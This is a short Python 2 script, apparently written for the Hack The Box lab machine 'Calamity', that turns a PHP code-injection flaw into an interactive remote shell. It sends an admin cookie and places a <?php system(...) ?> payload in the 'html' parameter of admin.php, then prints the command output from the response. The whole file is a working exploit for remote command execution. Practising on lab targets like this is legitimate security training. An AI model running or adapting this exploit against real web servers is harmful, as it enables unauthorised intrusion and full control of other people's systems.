#! /usr/bin/python
# Hackthebox Calamity shell to interact with the machine 10.10.10.27 / by ihebski / Sold1er

import requests
cookies = dict(adminpowa='noonecares')

def shell(cmd):   
	r = requests.get('http://10.10.10.27/admin.php?html=<?php system("'+cmd+'"); ?>', cookies=cookies)
	html = r.text
	return html[html.find("</html>")+7:]
       


if __name__ == '__main__':
	print "[+] connected to 10.10.10.27 ..."
	while True:
		cmd = raw_input("\033[92mbash $ ")   
                print shell(cmd)
